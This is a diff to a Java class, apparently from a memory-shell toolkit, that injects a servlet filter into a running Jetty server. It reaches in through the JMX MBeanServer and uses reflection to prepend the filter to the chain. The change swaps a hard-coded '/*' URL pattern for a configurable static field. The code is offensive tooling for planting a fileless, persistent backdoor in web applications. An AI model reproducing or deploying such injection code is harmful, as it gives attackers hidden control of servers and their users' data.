@@ -18,10 +18,11 @@ import java.util.*;
  */
 public class JFMSFromJMX implements Filter {
 
+	public static String pattern;
+
 	static {
 		try {
 			String filterName = "su18" + System.nanoTime();
-			String urlPattern = "/*";
 
 			JmxMBeanServer mBeanServer = (JmxMBeanServer) ManagementFactory.getPlatformMBeanServer();
 
@@ -94,7 +95,7 @@ public class JFMSFromJMX implements Filter {
 						Method method        = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
 						method.setAccessible(true);
 						method.invoke(filterMapping, holder);
-						filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});
+						filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{pattern}});
 						filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
 
 						// prependFilterMapping 会自动把 filter 加到最前面
